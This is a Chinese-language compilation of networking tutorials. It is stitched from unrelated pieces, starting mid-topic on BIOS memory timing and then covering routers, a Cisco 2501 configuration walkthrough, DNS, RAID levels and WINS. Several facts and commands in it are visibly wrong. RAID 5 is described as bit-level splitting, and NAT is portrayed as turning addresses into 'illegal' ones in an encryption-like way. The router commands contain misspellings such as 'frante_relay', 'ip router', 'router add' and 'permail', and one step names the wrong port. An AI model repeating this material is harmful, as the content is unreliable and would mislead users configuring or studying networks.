　有些主板上还提供了对内存的速度进行分别调整的选项：BANK 0/1（还有2/3和4/5两种，一共三个选项）DRAM TIMING。在主板的说明书上写得一般都比较保守，诸如“我们不建议用户自行更改此设定……”或类似的字样。但实际上我们完全可以将其调整到性能优先的方式，不过这对内存的要求比较高，部分品质不佳的内存在调整之后会出现死机、不稳定等现象。如果出现这些情况，只要改回来就OK了。此选项一共有以下几种可选项：SDRAM 8/10ns，Normal，Medium，Fast和Turbo。从字面上来理解，当然是Turbo最快了，内存性能不高的朋友如果有耐心，可以逐一试试寻找出最优状态。现在我们将这三个相关选项统统调整到“Turbo”试试：测试结果见图5，Memory BenchMark中的得分又有不少提高。
路由器
路由器是什么
所谓路由就是指通过相互连接的网络把信息从源地点移动到目标地点的活动。一般来说，在路由过程中，信息至少会经过一个或多个中间节点。通常，人们会把路由和交换进行对比，这主要是因为在普通用户看来两者所实现的功能是完全一样的。其实，路由和交换之间的主要区别就是交换发生在OSI参考模型的第二层（数据链路层），而路由发生在第三层，即网络层。这一区别决定了路由和交换在移动信息的过程中需要使用不同的控制信息，所以两者实现各自功能的方式是不同的。 
　　早在40多年之间就已经出现了对路由技术的讨论，但是直到80年代路由技术才逐渐进入商业化的应用。路由技术之所以在问世之初没有被广泛使用主要是因为80年代之前的网络结构都非常简单，路由技术没有用武之地。直到最近十几年，大规模的互联网络才逐渐流行起来，为路由技术的发展提供了良好的基础和平台。
　　路由器是互联网的主要节点设备。路由器通过路由决定数据的转发。转发策略称为路由选择（routing），这也是路由器名称的由来（router，转发者）。作为不同网络之间互相连接的枢纽，路由器系统构成了基于 TCP/IP 的国际互连网络 Internet 的主体脉络，也可以说，路由器构成了 Internet 的骨架。它的处理速度是网络通信的主要瓶颈之一，它的可靠性则直接影响着网络互连的质量。因此，在园区网、地区网、乃至整个 Internet 研究领域中，路由器技术始终处于核心地位，其发展历程和方向，成为整个 Internet 研究的一个缩影。在当前我国网络基础建设和信息建设方兴未艾之际，探讨路由器在互连网络中的作用、地位及其发展方向，对于国内的网络技术研究、网络建设，以及明确网络市场上对于路由器和网络互连的各种似是而非的概念，都具有重要的意义。
  路由器的作用
路由器的一个作用是连通不同的网络，另一个作用是选择信息传送的线路。选择通畅快捷的近路，能大大提高通信速度，减轻网络系统通信负荷，节约网络系统资源，提高网络系统畅通率，从而让网络系统发挥出更大的效益来。
　　从过滤网络流量的角度来看，路由器的作用与交换机和网桥非常相似。但是与工作在网络物理层，从物理上划分网段的交换机不同，路由器使用专门的软件协议从逻辑上对整个网络进行划分。例如，一台支持IP协议的路由器可以把网络划分成多个子网段，只有指向特殊IP地址的网络流量才可以通过路由器。对于每一个接收到的数据包，路由器都会重新计算其校验值，并写入新的物理地址。因此，使用路由器转发和过滤数据的速度往往要比只查看数据包物理地址的交换机慢。但是，对于那些结构复杂的网络，使用路由器可以提高网络的整体效率。路由器的另外一个明显优势就是可以自动过滤网络广播。从总体上说，在网络中添加路由器的整个安装过程要比即插即用的交换机复杂很多。
　　一般说来，异种网络互联与多个子网互联都应采用路由器来完成。
　　路由器的主要工作就是为经过路由器的每个数据帧寻找一条最佳传输路径，并将该数据有效地传送到目的站点。由此可见，选择最佳路径的策略即路由算法是路由器的关键所在。为了完成；这项工作，在路由器中保存着各种传输路径的相关数据——路径表（Routing Table），供路由选择；时使用。路径表中保存着子网的标志信息、网上路由器的个数和下一个路由器的名字等内容。路径表可以是由系统管理员固定设置好的，也可以由系统动态修改，可以由路由器自动调整，也可以由主机控制。
　　1．静态路径表 

　　由系统管理员事先设置好固定的路径表称之为静态（static）路径表，一般是在系统安装时就根据网络的配置情况预先设定的，它不会随未来网络结构的改变而改变。
　　2．动态路径表 
　　动态（Dynamic）路径表是路由器根据网络系统的运行情况而自动调整的路径表。路由器根据路由选择协议（Routing Protocol）提供的功能，自动学习和记忆网络运行情况，在需要时自动计算数据传输的最佳路径。
路由器的结构
路由器的体系结构 
　　从体系结构上看，路由器可以分为第一代单总线单CPU结构路由器、第二代单总线主从CPU结构路由器、第三代单总线对称式多CPU结构路由器；第四代多总线多CPU结构路由器、第五代共享内存式结构路由器、第六代交叉开关体系结构路由器和基于机群系统的路由器等多类。
　　路由器的构成 
　　路由器具有四个要素：输入端口、输出端口、交换开关和路由处理器。
　　输入端口是物理链路和输入包的进口处。端口通常由线卡提供，一块线卡一般支持4、8或16个端口，一个输入端口具有许多功能。第一个功能是进行数据链路层的封装和解封装。第二个功能是在转发表中查找输入包目的地址从而决定目的端口（称为路由查找），路由查找可以使用一般的硬件来实现，或者通过在每块线卡上嵌入一个微处理器来完成。第三，为了提供QoS（服务质量），端口要对收到的包分成几个预定义的服务级别。第四，端口可能需要运行诸如SLIP（串行线网际协议）和PPP（点对点协议）这样的数据链路级协议或者诸如PPTP（点对点隧道协议）这样的网络级协议。一旦路由查找完成，必须用交换开关将包送到其输出端口。如果路由器是输入端加队列的，则有几个输入端共享同一个交换开关。这样输入端口的最后一项功能是参加对公共资源（如交换开关）的仲裁协议。
　　交换开关可以使用多种不同的技术来实现。迄今为止使用最多的交换开关技术是总线、交叉开关和共享存贮器。最简单的开关使用一条总线来连接所有输入和输出端口，总线开关的缺点是其交换容量受限于总线的容量以及为共享总线仲裁所带来的额外开销。交叉开关通过开关提供多条数据通路，具有N×N个交叉点的交叉开关可以被认为具有2N条总线。如果一个交叉是闭合，输入总线上的数据在输出总线上可用，否则不可用。交叉点的闭合与打开由调度器来控制，因此，调度器限制了交换开关的速度。在共享存贮器路由器中，进来的包被存贮在共享存贮器中，所交换的仅是包的指针，这提高了交换容量，但是，开关的速度受限于存贮器的存取速度。尽管存贮器容量每18个月能够翻一番，但存贮器的存取时间每年仅降低5%，这是共享存贮器交换开关的一个固有限制。
　　输出端口在包被发送到输出链路之前对包存贮，可以实现复杂的调度算法以支持优先级等要求。与输入端口一样，输出端口同样要能支持数据链路层的封装和解封装，以及许多较高级协议。
　　路由处理器计算转发表实现路由协议，并运行对路由器进行配置和管理的软件。同时，它还处理那些目的地址不在线卡转发表中的包
路由器的类型互联网各种级别的网络中随处都可见到路由器。接入网络使得家庭和小型企业可以连接到某个互联网服务提供商；企业网中的路由器连接一个校园或企业内成千上万的计算机；骨干网上的路由器终端系统通常是不能直接访问的，它们连接长距离骨干网上的ISP和企业网络。互联网的快速发展无论是对骨干网、企业网还是接入网都带来了不同的挑战。骨干网要求路由器能对少数链路进行高速路由转发。企业级路由器不但要求端口数目多、价格低廉，而且要求配置起来简单方便，并提供QoS。
　　1．接入路由器
　　接入路由器连接家庭或ISP内的小型企业客户。接入路由器已经开始不只是提供SLIP或PPP连接，还支持诸如PPTP和IPSec等虚拟私有网络协议。这些协议要能在每个端口上运行。诸如ADSL等技术将很快提高各家庭的可用带宽，这将进一步增加接入路由器的负担。由于这些趋势，接入路由器将来会支持许多异构和高速端口，并在各个端口能够运行多种协议，同时还要避开电话交换网。
　　2．企业级路由器
　　企业或校园级路由器连接许多终端系统，其主要目标是以尽量便宜的方法实现尽可能多的端点互连，并且进一步要求支持不同的服务质量。许多现有的企业网络都是由Hub或网桥连接起来的以太网段。尽管这些设备价格便宜、易于安装、无需配置，但是它们不支持服务等级。相反，有路由器参与的网络能够将机器分成多个碰撞域，并因此能够控制一个网络的大小。此外，路由器还支持一定的服务等级，至少允许分成多个优先级别。但是路由器的每端口造价要贵些，并且在能够使用之前要进行大量的配置工作。因此，企业路由器的成败就在于是否提供大量端口且每端口的造价很低，是否容易配置，是否支持QoS。另外还要求企业级路由器有效地支持广播和组播。企业网络还要处理历史遗留的各种LAN技术，支持多种协议，包括IP、IPX和Vine。它们还要支持防火墙、包过滤以及大量的管理和安全策略以及VLAN。
　　3．骨干级路由器
　　骨干级路由器实现企业级网络的互联。对它的要求是速度和可靠性，而代价则处于次要地位。硬件可靠性可以采用电话交换网中使用的技术，如热备份、双电源、双数据通路等来获得。这些技术对所有骨干路由器而言差不多是标准的。骨干IP路由器的主要性能瓶颈是在转发表中查找某个路由所耗的时间。当收到一个包时，输入端口在转发表中查找该包的目的地址以确定其目的端口，当包越短或者当包要发往许多目的端口时，势必增加路由查找的代价。因此，将一些常访问的目的端口放到缓存中能够提高路由查找的效率。不管是输入缓冲还是输出缓冲路由器，都存在路由查找的瓶颈问题。除了性能瓶颈问题，路由器的稳定性也是一个常被忽视的问题。
　　4．太比特路由器
　　在未来核心互联网使用的三种主要技术中，光纤和DWDM都已经是很成熟的并且是现成的。如果没有与现有的光纤技术和DWDM技术提供的原始带宽对应的路由器，新的网络基础设施将无法从根本上得到性能的改善，因此开发高性能的骨干交换/路由器（太比特路由器）已经成为一项迫切的要求。太比特路由器技术现在还主要处于开发实验阶段。 
路由器的基本协议与技术 
　　VPN 
　　VPN（Virtual Private Network-虚拟专用网）解决方案是路由器具有的重要功能之一。其解决方案大致如下：
　　1．访问控制
　　一般分为PAP（口令认证协议）和CHAP（高级口令认证协议）两种协议。PAP要求登录者向目标路由器提供用户名和口令，与其访问列表（Access List）中的信息相符才允许其登录。它虽然提供了一定的安全保障，但用户登录信息在网上无加密传递，易被人窃取。CHAP便应运而生，它把一随机初始值与用户原始登录信息（用户名和口令）经Hash算法翻译后形成新的登录信息。这样在网上传递的用户登录信息对黑客来说是不透明的，且由于随机初始值每次不同，用户每次的最终登录信息也会不同，即使某一次用户登录信息被窃取，黑客也不能重复使用。需要注意的是，由于各厂商采取各自不同的Hash算法，所以CHAP无互操作性可言。要建立VPN需要VPN两端放置相同品牌路由器。
　　2．数据加密
　　在加密过程中加密位数是一个很重要的参数，它直接关系到解密的难易程度，其中Intel 9000系列路由器表现最为优异，为一百多位加密。
　　3．NAT（Network Address Translation-网络地址转换协议）
　　如同用户登录信息一样，IP和MAC地址在网上无加密传递也很不安全。NAT可把合法IP地址和MAC地址翻译成非法IP地址和MAC地址在网上传递，到达目标路由器后反翻译成合法IP与MAC地址，这一过程有点像CHAP，翻译算法厂商各自有不同标准，不能实现互操作。
　　QoS 
　　QoS（Quality of Service-服务质量）本来是ATM（Asynchronous Transmit Mode）中的专用术语，在IP上原来是不谈QoS的，但利用IP传VOD等多媒体信息的应用越来越多，IP作为一个打包的协议显得有点力不从心：延迟长且不为定值，丢包造成信号不连续且失真大。为解决这些问题，厂商提供了若干解决方案：第一种方案是基于不同对象的优先级，某些设备（多为多媒体应用）发送的数据包可以后到先传。第二种方案基于协议的优先级，用户可定义哪种协议优先级高，可后到先传，Intel和Cisco都支持。第三种方案是做链路整合MLPPP（Multi Link Point to Point Protocol），Cisco支持可通过将连接两点的多条线路做带宽汇聚，从而提高带宽。第四种方案是做资源预留RSVP（Resource Reservation Protocol），它将一部分带宽固定的分给多媒体信号，其它协议无论如何拥挤，也不得占用这部分带宽。这几种解决方案都能有效的提高传输质量。
　　RIP、OSPF和BGP协议 
　　互联网上现在大量运行的路由协议有RIP（Routing Information Protocol-路由信息协议）、OSPF（Open Shortest Path First--开放式最短路优先）和BGP（Border Gateway Protocol—边界网关协议）。RIP、OSPF是内部网关协议，适用于单个ISP的统一路由协议的运行，由一个ISP运营的网络称为一个自治系统。BGP是自治系统间的路由协议，是一种外部网关协议。
　　RIP是推出时间最长的路由协议，也是最简单的路由协议。它主要传递路由信息（路由表）来广播路由。每隔30秒，广播一次路由表，维护相邻路由器的关系，同时根据收到的路由表计算自己的路由表。RIP运行简单，适用于小型网络，互联网上还在部分使用着RIP。
　　OSPF协议是“开放式最短路优先”的缩写。“开放”是针对当时某些厂家的“私有”路由协议而言，而正是因为协议开放性，才使得OSPF具有强大的生命力和广泛的用途。它通过传递链路状态（连接信息）来得到网络信息，维护一张网络有向拓扑图，利用最小生成树算法得到路由表。OSPF是一种相对复杂的路由协议。
　　总的来说，OSPF、RIP都是自治系统内部的路由协议，适合于单一的ISP（自治系统）使用。一般说来，整个互联网并不适合跑单一的路由协议，因为各ISP有自己的利益，不愿意提供自身网络详细的路由信息。为了保证各ISP利益，标准化组织制定了ISP间的路由协议BGP。
　　BGP处理各ISP之间的路由传递。其特点是有丰富的路由策略，这是RIP、OSPF等协议无法做到的，因为它们需要全局的信息计算路由表。BGP通过ISP边界的路由器加上一定的策略，选择过滤路由，把RIP、OSPF、BGP等的路由发送到对方。全局范围的、广泛的互联网是BGP处理多个ISP间的路由的实例。BGP的出现，引起了互联网的重大变革，它把多个ISP有机的连接起来，真正成为全球范围内的网络。带来的副作用是互联网的路由爆炸，现在互联网的路由大概是60000条，这还是经过“聚合”后的数字。 配置BGP需要对用户需求、网络现状和BGP协议非常了解，还需要非常小心，BGP运行在相对核心的地位，一旦出错，其造成的损失可能会很大！　　　　IPv6技术 
　　迅速发展中的互联网将不再是仅仅连接计算机的网络，它将发展成能同电话网、有线电视网类似的信息通信基础设施。因此，正在使用的IP（互联网协议）已经难以胜任，人们迫切希望下一代 IP即IPv6的出现。
　　IPv6是IP的一种版本，在互联网通信协议TCP/IP中，是OSI模型第3层(网络层)的传输协议。它同目前广泛使用的、1974年便提出的IPv4相比，地址由32位扩充到128位。从理论上说，地址的数量由原先的4.3×109个增加到4.3×1038个。之所以必须从现行的IPv4改用IPv6，主要有二个原因。
　　1．由于互联网迅速发展，地址数量已经不够用，这使得网络管理花费的精力和费用令人难以承受。地址的枯竭是促使向拥有128位地址空间过渡的首要原因。
　　2．随着主机数目的增加，决定数据传输路由的路由表在不断加大。路由器的处理性能跟不上这种迅速增长。长此以往，互联网连接将难以提供稳定的服务。经由IPv6，路由数可以减少一个数量级。
　　为了使互联网连接许多东西变得简单，而且使用容易，必须采用IPv6。IPv6所以能做到这一点，是因为它使用了四种技术:地址空间的扩充、可使路由表减小的地址构造、自动设定地址以及提高安全保密性。
　　IPv6在路由技术上继承了IPv4的有利方面，代表未来路由技术的发展方向，许多路由器厂商目前已经投入很大力量以生产支持IPv6的路由器。当然IPv6也有一些值得注意和效率不高的地方，IPv4/NAT和IPv6将会共存相当长的一段时间。
路由器的配置与调试
路由器在计算机网络中有着举足轻重的地位，是计算机网络的桥梁。通过它不仅可以连通不同的网络，还能选择数据传送的路径，并能阻隔非法的访问。 
　　路由器的配置对初学者来说，并不是件十分容易的事。现将路由器的一般配置和简单调试介绍给大家，供朋友们在配置路由器时参考，本文以Cisco2501为例。 
　　Cisco2501有一个以太网口（AUI）、一个Console口（RJ45）、一个AUX口（RJ45）和两个同步串口，支持DTE和DCE设备，支持 EIA/TIA-232、 EIA/TIA-449、 V.35 、X.25和EIA-530接口。 
　　一．配置 
　　1．配置以太网端口 
　　# conf t（从终端配置路由器） 
　　# int e0（指定E0口） 
　　# ip addr ABCD XXXX（ABCD 为以太网地址，XXXX为子网掩码） 
　　# ip addr ABCD XXXX secondary（E0口同时支持两个地址类型。如果第一个为 A类地址，则第二个为B或C类地址） 
　　# no shutdown（激活E0口） 
　　# exit 
　　完成以上配置后，用ping命令检查E0口是否正常。如果不正常，一般是因为没有激活该端口，初学者往往容易忽视。用no shutdown命令激活E0口即可。 
　　2．X.25的配置 
　　# conf t 
　　# int S0（指定S0口） 
　　# ip addr ABCD XXXX（ABCD 为以太网S0 的IP地址，XXXX为子网掩码） 
　　# encap X25-ABC（封装X.25协议。ABC指定X.25为DTE或DCE操作，缺省为DTE） 
　　# x25 addr ABCD（ABCD为S0的X.25端口地址，由邮电局提供） 
　　# x25 map ip ABCD XXXX br（映射的X.25地址。ABCD为对方路由器（如：S0）的IP 地址，XXXX为对方路由器（如：S0）的X.25端口地址） 
　　# x25 htc X（配置最高双向通道数。X的取值范围1-4095，要根据 邮电局实际提供的数字配置） 
　　# x25 nvc X（配置虚电路数，X不可超过邮电局实际提供的数否则将影响数据的正常传输） 
　　# exit 
　　S0端口配置完成后，用no shutdown命令激活E0口。如果ping S0端口正常，ping 映射的X.25 IP地址即对方路由器端口IP地址不通，则可能是以下几种情况引起的：1）本机X.25地址配置错误，重新与邮局核对（X.25地址长度为13位）；2）本机映射IP地址或X.25地址配置错误，重新配置正确；3）对方IP地址或X.25地址配置错误；4）本机或对方路由配置错误。 
　　能够与对方通讯，但有丢包现象。出现这种情况，一般有以下几种可能：1）线路情况不好，或网卡、RJ45插头接触不良；2）x25 htc最高双向通道数X的取值范围和x25nvc 虚电路数X超出邮电局实际提供的数字。最高双向通道数和虚电路数这两个值越大越好，但绝对不能超出邮电局实际提供的数字，否则就会出现丢包现象。 
　　3．专线的配置 
　　# conf t 
　　# int　S2（指定S2口） 
　　# ip addr ABCD XXXX（ABCD 为S2 的IP地址，XXXX为子网掩码） 
　　# exit 
　　专线口配置完成后，用no shutdown命令激活S2口即可。 
　　4．帧中继的配置 
　　# conf t 
　　# int s0 
　　# ip addr ABCD XXXX （ABCD 为S0 的IP地址,XXXX为子网掩码） 
　　# encap frante_relay （封装frante_relay 协议） 
　　# no nrzi_encoding （NRZI=NO） 
　　# frame_relay lmi_type q933a （LMI使用Q933A标准．LMI（Local management Interface） 有3种：ANSI：T1.617、CCITTY：Q933A和Cisco特有的标准） 
　　# fram-relay intf-typ ABC（ABC为帧中继设备类型，它们分别是DTE设备、DCE交换机或NNI（网络接点接口）支持） 
　　# frame_relay interface_dlci 110 br（配置DLCI（数据链路连接标识符）） 
　　# frame-relay map ip ABCD XXXX broadcast （建立帧中继映射。ABCD为对方IP地址，XXXX为本地DLCI号，broadcast允许广播向前转发或更新路由） 
　　# no shutdown （激活本端口） 
　　# exit 
　　帧中继S0端口配置完成后，用ping命令检查S0口。如果不正常，通常是因为没有激活该端口，用no shutdown命令激活S0口即可。如果ping S0端口正常，ping 映射的IP地址不正常，则可能是帧中继交换机或对方配置错误，需要综合排查。 
　　5．配置同步/异步口（适用于2522） 
　　# conf t 
　　# int s2 
　　# ph asyn （配置S2为异步口） 
　　# ph sync （配置S2为同步口） 
　　6．动态路由的配置 
　　# conf t 
　　# router eigrp 20 （使用EIGRP路由协议。常用的路由协议有RIP、IGRP、IS-IS等） 
　　# passive-interface serial0 （若S0与X.25相连，则输入本条指令） 
　　# passive-interface serial1 （若S1与X.25相连，则输入本条指令） 
　　# network ABCD （ABCD为本机的以太网地址） 
　　# network XXXX （XXXX为S0的IP地址） 
　　# no auto-summary 
　　# exit 
　　7．静态路由的配置 
　　# ip router ABCD XXXX YYYY 90 （ABCD为对方路由器的以太网地址，XXXX 为子网掩码，YYYY为对方对应的广域网端口地址） 
　　# dialer-list 1 protocol ip permail 
　　二． 综合调试 
　　当路由器全部配置完毕后，可进行一次综合调试。 
　　1．首先将路由器的以太网口和所有要使用的串口都激活。方法是进入该口，执行no shutdown。 
　　2．将和路由器相连的主机加上缺省路由（中心路由器的以太地址）。方法是在Unix系统的超级用户下执行：router add default XXXX 1（XXXX为路由器的E0口地址）。每台主机都要加缺省路由，否则，将不能正常通讯。 
　　3．ping本机的路由器以太网口，若不通，可能以太网口没有激活或不在一个网段上。ping广域网口，若不通，则没有加缺省路由。ping对方广域网口，若不通，路由器配置错误。ping主机以太网口，若不通，对方主机没有加缺省路由。 
　　4．在专线卡X.25主机上加网关（静态路由）。方法是在Unix系统的超级用户下执行：router add X.X.X.X Y.Y.Y.Y 1（X.X.X.X为对方以太网地址，Y.Y.Y.Y为对方广域网地址）。 
　　5．使用Tracert对路由进行跟踪，以确定不通网段。
网络问答
问：什么是网关？
——答：网关是网络连接设备的重要组成部分，它不仅具有路由的功能，而且能在两个不同的协议集之间进行转换，从而使不同的网络之间进行互联。例如：一个Net-ware局域网通过网关可以访问IBM的SNA网络，这样使用IPX协议的PC就可和SNA网络上的IBM主机进行通信。 
问：什么是交换机？
——答：交换机也叫交换式集线器，它通过对信息进行重新生成，并经过内部处理后转发至指定端口，具备自动寻址能力和交换作用，由于交换机根据所传递信息包的目的地址，将每一信息包独立地从源端口送至目的端口，避免了和其他端口发生碰撞，因此，交换机可以同时互不影响的传送这些信息包，并防止传输碰撞，提高了网络的实际吞吐量。 
问：什么是级联？
——答：级联是通过双绞线把需要级联的设备通过级联端口相连接，从而达到增加同一网络端口数目的方法。 
问：什么是集线器？
——答：集线器是对网络进行集中管理的最小单元，它只是一个信号放大和中转的设备，不具备自动寻址能力和交换作用，由于所有传到集线器的数据均被广播到与之相连的各个端口，因而容易形成数据堵塞。 
问：什么是服务器？
——答：服务器是指具有固定的地址，并为网络用户提供服务的节点，它是实现资源共享的重要组成部分，服务器主要有网络服务器、打印服务器、终端服务器、磁盘服务器和文件服务器等。 
问：什么是工作站？
——答：工作站是一种高档的微型计算机，通常配有高分辨率的大屏幕显示器及容量很大的内存储器和外部存储器，并且具有较强的信息处理功能和高性能的图形、图像处理功能以及联网功能。 
问：什么是MAC地址？
——答：MAC地址一般是一个12位的十六进制地址，用于标识网卡，一般来说，每块网卡的MAC地址是唯一的。 
问：什么是“DNS”？其中文为何？
答：DNS，简单地说，就是Domain Name System，翻成中文就是“域名系统”。 
问：DNS有什么用途？ 
答：在一个TCP/IP架构的网络（例如Internet）环境中，DNS是一个非常重要而且常用的系统。主要的功能就是将人易于记忆的Domain Name与人不容易记忆的IP Address作转换。而上面执行DNS服务的这台网络主机，就可以称之为DNS Server。基本上，通常我们都认为DNS只是将Domain Name转换成IP Address，然后再使用所查到的IP Address去连接（俗称“正向解析”）。事实上，将IP Address转换成Domain Name的功能也是相当常使用到的，当login到一台Unix工作站时，工作站就会去做反查，找出你是从哪个地方连线进来的（俗称“逆向解析”）。 
问：DNS是怎么运作的？ 
答：DNS是使用层的方式来运作的。例如：哈工大紫丁香站的Domain Name为bbs.hit.edu.cn，这个Domain Name当然不是凭空而来的，是从.edu.cn所分配下来的。.edu.cn又是从.cn授予（delegation）的。.cn是从哪里来的呢？答案是从“.”，也就是所谓的“根域”（root domain）来的。根领域已经是Domain Name的最上层。而“.”这层是由InterNIC（Internet Network Information Center，互联网信息中心）所管理。全世界的Domain Name就是这样，一层一层的授予下来。 
问：当我查一个Domain Name时，DNS是怎么查出它的IP的呢？ 
答：举个例子，假设今天我们查的Domain Name（作一个dns query）为bbs.hit.edu.cn时，DNS Server会这么处理： 
(1)你所用的电脑（可能是PC，也可能是工作站）送出一个问题给这台电脑所设定的DNS Server，提问：bbs.hit.edu.cn的IP是什么？ 
(2)这台DNS会先看看是不是在它的cache中，如果是，就丢出答案。如果不是，就从最上头查起。在DNS Server上面一定有设定“.”要跟谁问。所以，这个时候它就往“.”层的任何一台DNS（目前“.”有13台）问：.cn要问谁？ 
(3)“.”层的DNS会回答.cn要向谁查（同时你用的DNS会cache起来这个答案）。 
(4)接下来你所用的DNS就会向.cn这层的DNS问：.edu.cn要问谁？ 
(5).cn的这层就会回答.edu.cn要向谁查（同时你用的DNS也把这答案cache起来）。 
(6)直到bbs.hit.edu.cn回答：bbs.hit.edu.cn的IP是202.118.224.2（又cache起来）。 

经过了这么多的过程，终于得到了这个IP，接下来才能作进一步的连线。要注意的是，在每一层都会问一个问题，并且把答案记下来（cache起），而且还会忘掉（看该层的设定是要cache多久）。 
问：DNS要怎么设置？ 
答：如果，只是要使用DNS，那只要在TCP/IP的网络属性中设置即可。设置的方法跟使用的操作系统有关。例如：Windows 9x在“控制面板”→“网络”→“TCP/IP”→“属性”中，找到DNS的部分再来设置。Unix在/etc/resolv.conf这个文件中设置（如果，要架设一台DNS Server，就不是在这里讨论的了）。 
问：哪一台DNS资料最新？ 
答：如果你知道DNS是利用阶层架构运作的，那就应该知道，离你最近的DNS，就是最好的
什么是独立磁盘冗余阵列(RAID)技术独立磁盘冗余阵列（RAID）是在服务器等级用于高容量数据存储的公用系统。RAID系统使用许多小容量磁盘驱动器来存储大量数据，并且使可靠性和冗余度得到增强。对计算机来说，这样一种阵列就如同由多个磁盘驱动器构成的一个逻辑单元。 
RAID存储的方式多种多样。某些类型的RAID强调性能，某些则强调可靠性、容错或纠错能力。因此，可根据要完成的任务来选择类型。不过，所有的RAID系统共同的特点——也是其真正的优点则是“热交换”能力：用户可以取出一个存在缺陷的驱动器，并插入一个新的予以更换。对大多数类型的RAID来说，不必中断服务器或系统，就可以自动重建某个出现故障的磁盘上的数据。 
RAID并非保护大量数据的唯一途径，但是，常规的备份和镜像软件速度较慢，而且，如果一个驱动器出现故障，则往往需要中断系统。即使磁盘不导致服务器中断，IT工作人员仍需要断掉服务器来更换驱动器。相反，RAID利用镜像或奇偶信息来从剩余的驱动器重建数据，不必中断系统。 
Level0、3和5是三种最常见的RAID实施方式: 
RAIDLevel0即数据分割，是最基本的方式。在一个普通硬盘驱动器上，数据被存储在同一张盘的连续扇区上。RAID0至少使用两个磁盘驱动器，并将数据分成从512字节到数兆字节的若干块，这些数据块被交替写到磁盘中。第1段被写到磁盘1中，第2段被写到磁盘2中，如此等等。当系统到达阵列中的最后一个磁盘时，就写到磁盘1的下一分段，以下如此。分割数据将I／O负载平均分配到所有的驱动器。由于驱动器可以同时写或读，性能得以显著提高。但是，它却没有数据保护能力。如果一个磁盘出故障，数据就会丢失。RAID 0不适用于关键任务环境，但是，它却非常适合于视频生产和编辑或图像编辑。 
RAIDLevel3包括数据分割，另外，它还指定一个驱动器来存储奇偶信息。这就提供了某种容错功能，在数据密集型环境或单一用户环境中尤其有益于访问较长的连续记录。RAID 3需要同步主轴驱动器来预防较短记录的性能下降。 
RAIDLevel5类似于Level0，但是它不是将数据分成块，而是将每个字节的位拆分到多个磁盘。这样会增加管理费用，但是，如果一个磁盘出现故障，则它可以更换，数据可以从奇偶和纠错码中重建。RAID 5包括所有的读／写运行。它需要三到五个磁盘来组成阵列，最适合于不需要关键特性或几乎不进行写操作的多用户系统。 
其它不常见的RAID类型: 
RAIDLevel1是磁盘镜像——写到磁盘1中的一切也写到磁盘2中，从任何一个磁盘都可以读取。这样就提供了即时备份，但需要的磁盘驱动器数量最多，不能提高性能。RAID 1在多用户系统中提供最佳性能和容错能力，是最容易实施的配置，这最适用于财务处理、工资单、金融和高可用数据环境。 
RAIDLevel2是为大型机和超级计算机开发的。它可在工作不中断的情况下纠正数据，但是，RAID2倾向于较高的数据校验和纠错率。 
RAIDLevel4包括较大的数据条，这样，就可以从任何驱动器读取记录。由于这种类型缺乏对多种同时写操作的支持，因而，几乎不使用。 
RAIDLevel6几乎没有进行商用。它使用一种分配在不同的驱动器上的第二种奇偶方案，扩展了RAID5。它能承受多个驱动器同时出现故障，但是，性能——尤其是写操作却很差，而且，系统需要一个极为复杂的控制器。 
RAIDLevel7有一个实时嵌入操作系统用作控制器，一个高速总线用于缓存。它提供快速的I／O，但是价格昂贵。 
RAIDLevel10由数据条阵列组成，其中，每个条都是驱动器的一个RAID1阵列。它与RAID1的容错能力相同，面向需要高性能和冗余，但不需要高容量的数据库服务器。 
RAIDLevel53是最新的一种类型，实施情况同Level0数据条阵列，其中，每一段都是一个RAID3阵列。它的冗余与容错能力同RAID3。这对需要具有高数据传输率的RAID 3配置的IT系统有益，但是它价格昂贵、效率偏低.
WINS服务
WINS是Windows Internet Name Server（Windows网际名字服务）的简称。WINS为NetBIOS名字提供名字注册、更新、释放和转换服务，这些服务允许WINS服务器维护一个将NetBIOS名链接到IP地址的动态数据库，大大减轻了对网络交通的负担。 
一.我们为什么需要WINS服务 
在默认状态中，网络上的每一台计算机的NetBIOS名字是通过广播的方式来提供更新的，也就是说，假如网络上有n台计算机，那么每一台计算机就要广播n-1次，对于小型网络来说，这似乎并不影响网络交通，但是当大型网络来说，加重了网络的负担。因此WINS对大中型企业来说尤其重要。 
二.WINS工作原理 
上面说过，WINS服务器为客户端提供名字注册了、更新、释放和转换服务，下面就详细介绍这四个基本服务的工作原理： 
1.名字注册 
名字注册就是客户端从WINS服务器获得信息的过程，在WINS服务中，名字注册是动态的。 
当一个客户端启动时，它向所配置的WINS服务器发送一个名字注册信息（包括了客户机的IP地址和计算机名），如果WINS服务器正在运行，并且没有没有其它客户计算机注册了相同的名字，服务器就向客户端计算机返还一个成功注册的消息（包括了名字注册的存活期----TTL）。 
与IP地址一样，每个计算机都要求有唯一的计算机名，否则就无法通信。如果名字已经被其它计算机注册了，WINS服务将会验证该名字是否正在使用。如果该名字正在使用则注册失败（发回一个负确认的信息），否则就可以继续注册。 
2.名字更新 
因为客户端被分配了一个TTL（存活期），所有它的注册也有一定的期限，过了这个期限，WINS服务器将从数据库中删除这个名字的注册信息。它的过程是这样的： 
（1）.在过了存活期的1/8后，客户端开始不断试图更新它的名字注册，如果收到不到任何响应,WINS客户端每过2分钟重复更新浓度，直到存活期过了一半。 
（2）.当存活期过了一半时，WINS客户端将尝试与次选WINS服务器更新它的租约，它的过程与首选WINS服务器一样。 
（3）.如果时间过了一半后仍然没有成功的话，该客户端又回到它的首选WINS服务器了。 
在该过程中，不管是与首选还是次选WINS服务器，一旦名字注册成功之后，该WINS客户端的名字注册将被提供一个新的TTL值。
WINS服务介绍（二） 
3.名字释放 
在客户端的正常关机过程中，WINS客户端向WINS服务器发送一个名字释放的请求，以请求释放其映射在WINS服务器数据库中的IP地址和NetBIOS名字。收到释放请求后，WINS服务器验证一下在它的数据库中是否有该IP地址和NetBIOS名，如果有就可以正常释放了，否则就会出现错误（WINS服务器向WINS客户端发送一个负响应）。 
如果计算机没有正常关闭，WINS服务器将不知道其名字已经释放了，则该名字将不会失效，直到WINS名字注册记录过期。 
4.名字解析 
当客户端在许多网络操作中需要WINS服务器解析名字，例如当使用网络上其它计算机的共享文件时，为了得到共享文件，用户需要指定两件事：系统名和共享名，而系统名就需要转换成IP地址。 
名字解析过程是这样的： 
（1）.当客户端计算机想要转换一个名字时，它首先检查本地NetBIOS名字缓存器。 
（2）.如果名字不在本地NetBIOS名字缓存器中，便发送一个名字查询到首选WINS服务器（每隔15秒发送一次，共发三次），如果请求失败，则向次选WINS发送同样的请求。 
（3）.如果都失败了，那么名字解析可以通过其它途径来转换（例如本地广播、lmhosts文件和hosts文件、或者DNS来进行名字解析。 
